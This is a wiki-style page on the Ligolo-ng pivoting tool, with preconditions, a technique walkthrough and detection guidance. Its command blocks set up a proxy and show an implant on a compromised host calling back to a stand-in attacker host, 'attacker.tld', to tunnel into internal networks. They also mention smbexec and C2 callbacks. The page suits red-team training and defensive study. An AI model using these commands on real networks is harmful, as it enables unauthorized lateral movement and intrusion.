---
title: Ligolo-ng
slug: ligolo-ng
---

> **TL;DR:** Drop the agent on a pivot host, connect back to a proxy, and route attacker traffic through a TUN interface that exposes the remote network as if it were local — no SOCKS, no port-by-port forwards.

## What it is
Ligolo-ng (Nicocha30) is a userland pivoting tool that replaces classic chains of SSH `-D`, `chisel`, and `socat`. The attacker runs a `proxy` binary that creates a TUN device on the loopback host; the implant (`agent`) on the pivot box dials back over TLS and registers as a session. Once the operator types `start` in the proxy console, packets sent to routes the operator adds (`ip route add 10.0.0.0/8 dev ligolo`) are tunnelled inside the TLS channel and re-injected onto the agent host's NIC. The result: every tool that speaks IP — `nmap` with raw SYN, full `kerberos` flows, SMB, RDP — works transparently against the remote subnet without per-port wrangling.

## Preconditions / where it applies
- Code execution on a host that can reach the target segment (the agent's machine) and can dial out to the operator's proxy on a chosen port.
- Operator host can hold a TUN interface (Linux, macOS, Windows with WinTUN driver).
- TCP egress from the agent to the proxy (default 11601, TLS). UDP / ICMP transport optional via newer builds.

## Technique
1. Stand up the proxy and a TLS cert (self-signed is fine; pin via fingerprint).
2. Land the agent on the pivot and have it call home.
3. Bring up the interface, add routes for the segments you want, and operate normally.

```bash
# Operator (attacker)
sudo ip tuntap add ligolo mode tun
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# > session            # select connected agent
# > start              # begin forwarding
sudo ip route add 10.10.0.0/16 dev ligolo
```

```bash
# Pivot (Linux)
./agent -connect attacker.tld:11601 -ignore-cert &
# Or as a one-liner with cert pin
./agent -connect attacker.tld:11601 -accept-fingerprint <hex>
```

```powershell
# Pivot (Windows)
.\agent.exe -connect attacker.tld:11601 -ignore-cert
```

Operating with the tunnel up: `nmap 10.10.5.0/24` runs natively, `impacket-smbexec` lands on internal SMB, browsers point at internal apps. Reverse direction (`listener_add`) opens a port on the agent host that forwards back to the operator — useful for callbacks (e.g. a Cobalt Strike or Sliver listener "inside" the segment).

## Detection and defence
- Egress filtering: outbound TLS to non-CDN destinations from servers should be alarmed. Ligolo defaults look like generic TLS, so JA3/JA4 fingerprinting plus destination reputation is the practical signal.
- Endpoint detection: agent binaries are small Go statics — look for unsigned ELFs / unsigned PE with TUN/WinTUN driver loads from unusual processes.
- Network policy: deny outbound from server segments except to allowlisted update endpoints.
- Related: [[dns-enum]], [[http-enum]].

## References
- [Ligolo-ng GitHub](https://github.com/nicocha30/ligolo-ng) — source, releases, and operator/agent flag reference.
- [Nicocha30 — Introducing Ligolo-ng](https://blog.nicocha30.com/2021/11/12/introducing-ligolo-ng-a-new-tunneling-tool.html) — design rationale and TUN-based architecture.
